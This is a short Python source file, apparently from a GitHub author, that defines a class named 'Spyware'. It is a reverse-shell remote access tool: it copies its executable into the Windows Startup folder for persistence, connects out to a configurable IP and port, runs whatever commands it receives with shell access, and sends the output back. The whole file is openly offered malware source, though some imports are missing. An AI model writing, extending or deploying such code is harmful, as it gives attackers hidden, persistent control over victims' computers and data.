# -*-coding:UTF-8-*-
# coded by: https://github.com/N0-CL1CK

import socket

class Spyware():
    def __init__(self, ipaddr, port) -> None:
        self._ipport = (ipaddr, port)


    def autorun(self) -> None:
        _filen = basename(__file__)
        _exe_file = _filen.replace('.py', '.exe')
        system(f'copy {_exe_file} "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')


    def conn(self) -> bool:
        try:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._sock.connect(self._ipport)
            return True if self._sock else False
        except Exception as err:
            print(err)
    

    def cmd(self) -> None:
        from subprocess import Popen, PIPE
        
        try:
            proc = Popen(self._data, shell=True, stdin=PIPE, stderr=PIPE, stdout=PIPE)
            output = proc.stdout.read()+proc.stderr.read()
            self._sock.send(output+b'\n')    
            
        except Exception as err:
            print(err)


    def cli(self) -> None:
        from threading import Thread

        try:
            while True:
                self._data = self._sock.recv(1024).decode().strip()
                if self._data == ':/kill':
                    return
                else:
                    Thread(target=self.cmd).start()

        except Exception as err:
            self._sock.close()
